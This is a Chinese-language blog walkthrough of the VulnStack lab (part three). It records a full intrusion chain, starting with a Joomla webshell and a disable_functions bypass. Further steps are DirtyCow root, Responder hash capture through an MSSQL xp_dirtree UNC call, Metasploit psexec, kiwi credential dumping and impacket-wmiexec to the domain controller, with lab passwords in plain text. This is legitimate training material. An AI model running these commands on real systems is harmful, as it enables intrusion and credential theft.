@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="zh-Hans">
+<head><meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/><meta content="VulnStack内网靶场（三）" name="description"/>
+<title>VulnStack内网靶场（三）</title>
+<link href="https://fragrant1001.github.io/post/2023/vulnstack03/" rel="canonical"/>
+<link href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css" rel="stylesheet"/><meta content="VulnStack内网靶场（三）" property="og:title"/>
+<meta content="VulnStack内网靶场（三）" property="og:description"/>
+<meta content="https://fragrant1001.github.io/post/2023/vulnstack03/" property="og:url"/>
+<meta content="fragrant1001" property="og:site_name"/>
+<meta content="article" property="og:type"/><meta content="Post" property="article:section"/><meta content="MetaSploit" property="article:tag"/><meta content="frp" property="article:tag"/><meta content="impacket-wmiexec" property="article:tag"/><meta content="Responder" property="article:tag"/><meta content="kiwi" property="article:tag"/><meta content="2023-10-28T15:52:39+08:00" property="article:published_time"/><meta content="2023-10-28T15:52:39+08:00" property="article:modified_time"/><meta content="https://fragrant1001.github.io/post/2023/vulnstack03/vulnstack03.jpg" property="og:image"/>
+<meta content="@fragrant10" name="twitter:site"/>
+<meta content="@fragrant10" name="twitter:creator"/><meta content="VulnStack内网靶场（三）" name="twitter:title"/>
+<meta content="VulnStack内网靶场（三）" name="twitter:description"/><meta content="summary_large_image" name="twitter:card"/>
+<meta content="https://fragrant1001.github.io/post/2023/vulnstack03/vulnstack03.jpg" name="twitter:image"/>
+<link href="/img/favicon.ico" rel="shortcut icon"/>
+</head>
+<body class="article-page">
+<script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky">
+<button aria-label="Toggle Menu" class="hamburger hamburger--spin" id="toggle-menu" type="button">
+<span class="hamburger-box">
+<span class="hamburger-inner"></span>
+</span>
+</button>
+<header>
+<figure class="site-avatar">
+<a href="/">
+<img alt="Avatar" class="site-logo" height="300" loading="lazy" src="/img/IMG_4207_hu343229a556e1793866ec8f94dd379486_169822_300x0_resize_q75_box.JPG" width="300"/>
+</a>
+</figure>
+<div class="site-meta">
+<h1 class="site-name"><a href="/">fragrant1001</a></h1>
+<h2 class="site-description">Cyber security engineer...</h2>
+</div>
+</header><ol class="social-menu">
+<li>
+<a href="https://github.com/fragrant1001" rel="me" target="_blank" title="GitHub">
+<svg class="icon icon-tabler icon-tabler-brand-github" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+<path d="M0 0h24v24H0z" fill="none" stroke="none"></path>
+<path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path>
+</svg>
+</a>
+</li>
+<li>
+<a href="https://twitter.com/" rel="me" target="_blank" title="Twitter">
+<svg class="icon icon-tabler icon-tabler-brand-twitter" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+<path d="M0 0h24v24H0z" fill="none" stroke="none"></path>
+<path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z"></path>
+</svg>
+</a>
+</li>
+</ol><ol class="menu" id="main-menu">
+<li>
+<a href="/">
+<svg class="icon icon-tabler icon-tabler-home" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+<path d="M0 0h24v24H0z" stroke="none"></path>
+<polyline points="5 12 3 12 12 3 21 12 19 12"></polyline>
+<path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7"></path>
+<path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6"></path>
+</svg>
+<span>Home</span>
+</a>
+</li>
+<li>
+<a href="/archives/">
+<svg class="icon icon-tabler icon-tabler-archive" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+<path d="M0 0h24v24H0z" stroke="none"></path>
+<rect height="4" rx="2" width="18" x="3" y="4"></rect>
+<path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10"></path>
+<line x1="10" x2="14" y1="12" y2="12"></line>
+</svg>
+<span>Archives</span>
+</a>
+</li>
+<li>
+<a href="/search/">
+<svg class="icon icon-tabler icon-tabler-search" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+<path d="M0 0h24v24H0z" stroke="none"></path>
+<circle cx="10" cy="10" r="7"></circle>
+<line x1="21" x2="15" y1="21" y2="15"></line>
+</svg>
+<span>Search</span>
+</a>
+</li>
+<div class="menu-bottom-section">
+<li id="dark-mode-toggle">
+<svg class="icon icon-tabler icon-tabler-toggle-left" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+<path d="M0 0h24v24H0z" stroke="none"></path>
+<circle cx="8" cy="12" r="2"></circle>
+<rect height="12" rx="6" width="20" x="2" y="6"></rect>
+</svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+<path d="M0 0h24v24H0z" stroke="none"></path>
+<circle cx="16" cy="12" r="2"></circle>
+<rect height="12" rx="6" width="20" x="2" y="6"></rect>
+</svg>
+<span>Dark Mode</span>
+</li>
+</div>
+</ol>
+</aside>
+<aside class="sidebar right-sidebar sticky">
+<section class="widget archives">
+<div class="widget-icon">
+<svg class="icon icon-tabler icon-tabler-hash" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+<path d="M0 0h24v24H0z" stroke="none"></path>
+<line x1="5" x2="19" y1="9" y2="9"></line>
+<line x1="5" x2="19" y1="15" y2="15"></line>
+<line x1="11" x2="7" y1="4" y2="20"></line>
+<line x1="17" x2="13" y1="4" y2="20"></line>
+</svg>
+</div>
+<h2 class="widget-title section-title">Table of contents</h2>
+<div class="widget--toc">
+<nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#120-web服务器">120-Web服务器</a></li>
+<li><a href="#100出口服务器">100出口服务器</a></li>
+<li><a href="#20windows">20windows</a></li>
+<li><a href="#10域控">10域控</a></li>
+<li><a href="#30windows">30windows</a></li>
+</ul>
+</li>
+</ul>
+</nav>
+</div>
+</section>
+</aside>
+<main class="main full-width">
+<article class="has-image main-article">
+<header class="article-header">
+<div class="article-image">
+<a href="/post/2023/vulnstack03/">
+<img alt="Featured image of post VulnStack内网靶场（三）" height="531" loading="lazy" src="/post/2023/vulnstack03/vulnstack03_hu3d03a01dcc18bc5be0e67db3d8d209a6_1019912_800x0_resize_q75_box.jpg" srcset="/post/2023/vulnstack03/vulnstack03_hu3d03a01dcc18bc5be0e67db3d8d209a6_1019912_800x0_resize_q75_box.jpg 800w, /post/2023/vulnstack03/vulnstack03_hu3d03a01dcc18bc5be0e67db3d8d209a6_1019912_1600x0_resize_q75_box.jpg 1600w" width="800"/>
+</a>
+</div>
+<div class="article-details">
+<header class="article-category">
+<a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                内网渗透
+            </a>
+</header>
+<div class="article-title-wrapper">
+<h2 class="article-title">
+<a href="/post/2023/vulnstack03/">VulnStack内网靶场（三）</a>
+</h2>
+<h3 class="article-subtitle">
+            VulnStack内网靶场（三）
+        </h3>
+</div>
+<footer class="article-time">
+<div>
+<svg class="icon icon-tabler icon-tabler-calendar-time" fill="none" height="56" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="56" xmlns="http://www.w3.org/2000/svg">
+<path d="M0 0h24v24H0z" stroke="none"></path>
+<path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4"></path>
+<circle cx="18" cy="18" r="4"></circle>
+<path d="M15 3v4"></path>
+<path d="M7 3v4"></path>
+<path d="M3 11h16"></path>
+<path d="M18 16.496v1.504l1 1"></path>
+</svg>
+<time class="article-time--published">Oct 28, 2023</time>
+</div>
+<div>
+<svg class="icon icon-tabler icon-tabler-clock" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+<path d="M0 0h24v24H0z" stroke="none"></path>
+<circle cx="12" cy="12" r="9"></circle>
+<polyline points="12 7 12 12 15 15"></polyline>
+</svg>
+<time class="article-time--reading">
+                    2 minute read
+                </time>
+</div>
+</footer>
+</div>
+</header>
+<section class="article-content">
+<p>10.0.0.119和192.168.93.100是同一台机器，同时100的80、3360端口都会转发到192.168.93.120机器。</p>
+<h3 id="120-web服务器">120-Web服务器</h3>
+<p>快速端口扫描: <code>nmap -Pn -p- -sS 10.0.0.119</code><br/>
+固定端口扫版本以及用脚本扫: <code>nmap -Pn -p22,80,3306 -sC -sV 10.0.0.119</code></p>
+<pre tabindex="0"><code>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 5.3 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 25:84:c6:cc:2c:8a:7b:8f:4a:7c:60:f1:a3:c9:b0:22 (DSA)
+|_  2048 58:d1:4c:59:2d:85:ae:07:69:24:0a:dd:72:0f:45:a5 (RSA)
+80/tcp   open  http    nginx 1.9.4
+|_http-server-header: nginx/1.9.4
+|_http-generator: Joomla! - Open Source Content Management
+|_http-title: Home
+| http-robots.txt: 15 disallowed entries 
+| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+| /cli/ /components/ /includes/ /installation/ /language/ 
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+3306/tcp open  mysql   MySQL 5.7.27-0ubuntu0.16.04.1
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.7.27-0ubuntu0.16.04.1
+|   Thread ID: 317
+|   Capabilities flags: 63487
+|   Some Capabilities: ODBCClient, SupportsTransactions, FoundRows, LongColumnFlag, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, LongPassword, Support41Auth, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsCompression, SupportsLoadDataLocal, ConnectWithDatabase, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: \x07~ULB{,mL\x01O\x19u\x12\x1C\x10\x03\x0Ddj
+|_  Auth Plugin Name: mysql_native_password
+MAC Address: 94:E2:3C:A5:00:23 (Intel Corporate)
+</code></pre><p>joomscan和dirsearch的到phpinfo文件1.php、后台目录和备份配置文件configuration.php~，得到数据库连接凭证和路径等敏感信息</p>
+<pre tabindex="0"><code>  public $user = 'testuser';
+	public $password = 'cvcvgjASD!@';
+	public $db = 'joomla';
+	public $dbprefix = 'am2zu_';
+	public $live_site = '';
+	public $secret = 'gXN9Wbpk7ef3A4Ys';
+</code></pre><p>登陆mysql并修改后台管理员密码</p>
+<pre tabindex="0"><code>update am2zu_users set password=md5("1234567") where username='administrator';
+</code></pre><p>joomla后台新增模版文件getshell
+<img alt="joomlashell" class="gallery-image" data-flex-basis="470px" data-flex-grow="195" height="1272" loading="lazy" src="/post/2023/vulnstack03/image.png" srcset="/post/2023/vulnstack03/image_hu9cbe861c28d2b944bd29d80b74bd01ee_814410_480x0_resize_box_3.png 480w, /post/2023/vulnstack03/image_hu9cbe861c28d2b944bd29d80b74bd01ee_814410_1024x0_resize_box_3.png 1024w" width="2492"/></p>
+<p>蚁剑连接一句话木马之后发现不能执行命令，突破disable_fucntion</p>
+<pre tabindex="0"><code>http://10.0.0.119/bypass_disablefunc.php?cmd=ifconfig&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/bypass_disablefunc_x64.so
+</code></pre><p><img alt="bypassdisablefunction" class="gallery-image" data-flex-basis="315px" data-flex-grow="131" height="1120" loading="lazy" src="/post/2023/vulnstack03/image-1.png" srcset="/post/2023/vulnstack03/image-1_hu2d6adc7c65f50802d7648d654400941d_1130590_480x0_resize_box_3.png 480w, /post/2023/vulnstack03/image-1_hu2d6adc7c65f50802d7648d654400941d_1130590_1024x0_resize_box_3.png 1024w" width="1470"/></p>
+<p>没有主机ip说明做了反向代理，可能是nginx</p>
+<p>初步收集一下信息，上传fscan扫一下c段</p>
+<pre tabindex="0"><code>192.168.93.120:3306 open
+192.168.93.100:3306 open
+192.168.93.20:1433 open
+192.168.93.120:80 open
+192.168.93.100:80 open
+192.168.93.20:80 open
+192.168.93.120:22 open
+192.168.93.100:22 open
+[*]192.168.93.30
+   [-&gt;]win7
+   [-&gt;]192.168.93.30
+[*]192.168.93.20
+   [-&gt;]win2008
+   [-&gt;]192.168.93.20
+[*]192.168.93.10
+   [-&gt;]WIN-8GA56TNV3MV
+   [-&gt;]192.168.93.10
+[*] NetBios: 192.168.93.10   [+]DC WIN-8GA56TNV3MV.test.org      Windows Server 2012 R2 Datacenter 9600 
+[*] 192.168.93.10  (Windows Server 2012 R2 Datacenter 9600)
+[*] NetBios: 192.168.93.20   win2008.test.org                    Windows Server (R) 2008 Datacenter 6003 Service Pack 2 
+[*] 192.168.93.30  (Windows 7 Professional 7601 Service Pack 1)
+[*] 192.168.93.20  (Windows Server (R) 2008 Datacenter 6003 Service Pack 2)
+[+] mysql:192.168.93.120:3306:root 123
+[+] mysql:192.168.93.100:3306:root 123
+</code></pre><p>得到10、20、30都是windows且10是域控，其次是100就是有代理软件的机器，实际上web是在120上。也可以用<code>netstat -naplt</code>看当前机器在跟哪台机器在通信。
+<img alt="100-120" class="gallery-image" data-flex-basis="421px" data-flex-grow="175" height="934" loading="lazy" src="/post/2023/vulnstack03/image-2.png" srcset="/post/2023/vulnstack03/image-2_hue964d574e7a2c76931beeff569baf814_951443_480x0_resize_box_3.png 480w, /post/2023/vulnstack03/image-2_hue964d574e7a2c76931beeff569baf814_951443_1024x0_resize_box_3.png 1024w" width="1642"/></p>
+<h3 id="100出口服务器">100出口服务器</h3>
+<p>在<code>/tmp/mysql/test.txt</code>发现认证信息，可直接登录119机器。<code>ssh wwwuser@10.0.0.119 -oHostKeyAlgorithms=+ssh-dss</code>一定要带上后面的参数。</p>
+<pre tabindex="0"><code>adduser wwwuser
+passwd wwwuser_123Aqx
+</code></pre><p><img alt="119" class="gallery-image" data-flex-basis="395px" data-flex-grow="164" height="842" loading="lazy" src="/post/2023/vulnstack03/image-3.png" srcset="/post/2023/vulnstack03/image-3_hu3816e9d9ac6560a15505dda86349b68a_724108_480x0_resize_box_3.png 480w, /post/2023/vulnstack03/image-3_hu3816e9d9ac6560a15505dda86349b68a_724108_1024x0_resize_box_3.png 1024w" width="1388"/></p>
+<p>脏牛dirtycow提权</p>
+<pre tabindex="0"><code>[wwwuser@anonymous ~]$ gcc -pthread dirty.c -o dirty -lcrypt  
+[wwwuser@anonymous ~]$ rm -rf /tmp/passwd.bak               
+[wwwuser@anonymous ~]$ gcc -pthread dirty.c -o dirty -lcrypt  
+[wwwuser@anonymous ~]$ ./dirty
+……
+[wwwuser@anonymous ~]$ su firefart
+[wwwuser@anonymous ~]$ id
+</code></pre><p><img alt="dirtycow" class="gallery-image" data-flex-basis="433px" data-flex-grow="180" height="768" loading="lazy" src="/post/2023/vulnstack03/image-4.png" srcset="/post/2023/vulnstack03/image-4_huf2adc88c6218bfcfc380dda17876c344_423156_480x0_resize_box_3.png 480w, /post/2023/vulnstack03/image-4_huf2adc88c6218bfcfc380dda17876c344_423156_1024x0_resize_box_3.png 1024w" width="1388"/></p>
+<h3 id="20windows">20windows</h3>
+<ol>
+<li>上传frpc做代理</li>
+<li>上传Responder抓hash值</li>
+<li>连接20的1433(密码和mysql的一样)访问100的smb服务<code>EXEC master.sys.xp_dirtree "\\192.168.93.100\ttttanything",0,1</code></li>
+</ol>
+<p><img alt="Respond" class="gallery-image" data-flex-basis="345px" data-flex-grow="144" height="870" loading="lazy" src="/post/2023/vulnstack03/image-5.png" srcset="/post/2023/vulnstack03/image-5_hubfd579e7e6c1ef2beab82e73ac77dbd9_593596_480x0_resize_box_3.png 480w, /post/2023/vulnstack03/image-5_hubfd579e7e6c1ef2beab82e73ac77dbd9_593596_1024x0_resize_box_3.png 1024w" width="1254"/></p>
+<p>jhon对hash暴破得到密码<code>123qwe!ASD</code></p>
+<p>msf的psexec模块上线20机器</p>
+<pre tabindex="0"><code>msf6 &gt; use exploit/windows/smb/psexec
+msf6 exploit(windows/smb/psexec) &gt; set RHOSTS 192.168.93.20
+msf6 exploit(windows/smb/psexec) &gt; setg proxies socks5:127.0.0.1:6000
+msf6 exploit(windows/smb/psexec) &gt; set SMBUser administrator
+msf6 exploit(windows/smb/psexec) &gt; set SMBPass 123qwe!ASD
+msf6 exploit(windows/smb/psexec) &gt; set payload windows/x64/meterpreter/bind_tcp
+</code></pre><p><img alt="20msf" class="gallery-image" data-flex-basis="806px" data-flex-grow="335" height="490" loading="lazy" src="/post/2023/vulnstack03/image-6.png" srcset="/post/2023/vulnstack03/image-6_huba6ecac94e4f23f430422609ee7ee525_326981_480x0_resize_box_3.png 480w, /post/2023/vulnstack03/image-6_huba6ecac94e4f23f430422609ee7ee525_326981_1024x0_resize_box_3.png 1024w" width="1646"/></p>
+<p>确定域控的ip: <code>ipconfig /all</code>发现DNS服务器再ping一下即可</p>
+<h3 id="10域控">10域控</h3>
+<p>20msf上线后通过加载kiwi抓认证密码</p>
+<pre tabindex="0"><code>load kiwi
+creds_kerberos
+</code></pre><p><img alt="域控" class="gallery-image" data-flex-basis="517px" data-flex-grow="215" height="760" loading="lazy" src="/post/2023/vulnstack03/image-7.png" srcset="/post/2023/vulnstack03/image-7_hu25d855c14b724ee34599889b1166bbe5_414087_480x0_resize_box_3.png 480w, /post/2023/vulnstack03/image-7_hu25d855c14b724ee34599889b1166bbe5_414087_1024x0_resize_box_3.png 1024w" width="1638"/></p>
+<pre tabindex="0"><code>Administrator  TEST.ORG  zxcASDqw123!!
+Administrator  WIN2008   123qwe!ASD
+</code></pre><p>msf上线不了10机器，改用<code>impacket-wmiexec</code>执行命令</p>
+<pre tabindex="0"><code>proxychains -q impacket-wmiexec test.org/administrator@192.168.93.10
+</code></pre><p><img alt="10拿下" class="gallery-image" data-flex-basis="300px" data-flex-grow="125" height="994" loading="lazy" src="/post/2023/vulnstack03/image-8.png" srcset="/post/2023/vulnstack03/image-8_hubfaa5b3e566a080f387e78221eb10188_485318_480x0_resize_box_3.png 480w, /post/2023/vulnstack03/image-8_hubfaa5b3e566a080f387e78221eb10188_485318_1024x0_resize_box_3.png 1024w" width="1246"/></p>
+<h3 id="30windows">30windows</h3>
+<p>impacket-wmiexec上线，密码<code>123qwe!ASD</code>。注意不要加域</p>
+<p><img alt="30" class="gallery-image" data-flex-basis="363px" data-flex-grow="151" height="736" loading="lazy" src="/post/2023/vulnstack03/image-9.png" srcset="/post/2023/vulnstack03/image-9_hufe100cbbccbb3179ec81bb06a1190742_359827_480x0_resize_box_3.png 480w, /post/2023/vulnstack03/image-9_hufe100cbbccbb3179ec81bb06a1190742_359827_1024x0_resize_box_3.png 1024w" width="1116"/></p>
+<p>msf上线，也是不要加域</p>
+<pre tabindex="0"><code>msf6 exploit(windows/smb/psexec) &gt; set RHOSTS 192.168.93.30                                                                                                
+msf6 exploit(windows/smb/psexec) &gt; set SMBDomain .                                                                                                         
+msf6 exploit(windows/smb/psexec) &gt; set SMBPass 123qwe!ASD                                                                                                  
+msf6 exploit(windows/smb/psexec) &gt; exploit
+</code></pre><p><img alt="msf30" class="gallery-image" data-flex-basis="302px" data-flex-grow="125" height="1152" loading="lazy" src="/post/2023/vulnstack03/image-10.png" srcset="/post/2023/vulnstack03/image-10_hu4bd79718a8350c5db0fdcc5c26c14e62_657837_480x0_resize_box_3.png 480w, /post/2023/vulnstack03/image-10_hu4bd79718a8350c5db0fdcc5c26c14e62_657837_1024x0_resize_box_3.png 1024w" width="1450"/></p>
+</section>
+<footer class="article-footer">
+<section class="article-tags">
+<a href="/tags/metasploit/">MetaSploit</a>
+<a href="/tags/frp/">Frp</a>
+<a href="/tags/impacket-wmiexec/">impacket-wmiexec</a>
+<a href="/tags/responder/">Responder</a>
+<a href="/tags/kiwi/">kiwi</a>
+</section>
+<section class="article-copyright">
+<svg class="icon icon-tabler icon-tabler-copyright" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+<path d="M0 0h24v24H0z" stroke="none"></path>
+<circle cx="12" cy="12" r="9"></circle>
+<path d="M14.5 9a3.5 4 0 1 0 0 6"></path>
+</svg>
+<span>Licensed under CC BY-NC-SA 4.0</span>
+</section>
+</footer>
+<link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css" integrity="sha256-J+iAE0sgH8QSz9hpcDxXIftnj65JEZgNhGcgReTTK9s=" rel="stylesheet"/><script crossorigin="anonymous" defer="" integrity="sha256-InsNdER1b2xUewP+pKCUJpkhiqwHgqiPXDlIk7GzBu4=" src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js">
+</script><script crossorigin="anonymous" defer="" integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI=" src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js">
+</script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.querySelector(`.article-content`), {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ],
+            ignoredClasses: ["gist"]
+        });})
+</script>
+</article>
+<aside class="related-content--wrapper">
+<h2 class="section-title">Related content</h2>
+<div class="related-content">
+<div class="flex article-list--tile">
+<article class="has-image">
+<a href="/post/2023/vulnstack01/">
+<div class="article-image">
+<img alt="Featured image of post VulnStack内网靶场（一）" data-hash="md5-NcrShnVvvmuubgy6zg80mg==" height="150" loading="lazy" src="/post/2023/vulnstack01/cover.35cad286756fbe6bae6e0cbace0f349a_hu3d03a01dcc18bc5be0e67db3d8d209a6_645660_250x150_fill_q75_box_smart1.jpg" width="250"/>
+</div>
+<div class="article-details">
+<h2 class="article-title">VulnStack内网靶场（一）</h2>
+</div>
+</a>
+</article>
+</div>
+</div>
+</aside>
+<div class="disqus-container">
+<div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "fragrant10" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a class="dsq-brlink" href="https://disqus.com">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+<footer class="site-footer">
+<section class="copyright">
+        © 
+        
+        2023 fragrant1001
+    </section>
+<section class="powerby">
+        
+            Use it or lose it... <br/>
+        Built with <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo</a> <br/>
+        Theme <b><a data-version="3.21.0" href="https://github.com/CaiJimmy/hugo-theme-stack" rel="noopener" target="_blank">Stack</a></b> designed by <a href="https://jimmycai.com" rel="noopener" target="_blank">Jimmy</a>
+</section>
+</footer>
+<div aria-hidden="true" class="pswp" role="dialog" tabindex="-1">
+<div class="pswp__bg"></div>
+<div class="pswp__scroll-wrap">
+<div class="pswp__container">
+<div class="pswp__item"></div>
+<div class="pswp__item"></div>
+<div class="pswp__item"></div>
+</div>
+<div class="pswp__ui pswp__ui--hidden">
+<div class="pswp__top-bar">
+<div class="pswp__counter"></div>
+<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title="Share"></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+<div class="pswp__preloader">
+<div class="pswp__preloader__icn">
+<div class="pswp__preloader__cut">
+<div class="pswp__preloader__donut"></div>
+</div>
+</div>
+</div>
+</div>
+<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+<div class="pswp__share-tooltip"></div>
+</div>
+<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+</button>
+<div class="pswp__caption">
+<div class="pswp__caption__center"></div>
+</div>
+</div>
+</div>
+</div><script crossorigin="anonymous" defer="" integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js">
+</script><script crossorigin="anonymous" defer="" integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js">
+</script><link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css" rel="stylesheet"/><link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css" rel="stylesheet"/>
+</main>
+</div>
+<script crossorigin="anonymous" integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js">
+</script><script defer="" src="/ts/main.js" type="text/javascript"></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+</body>
+</html>
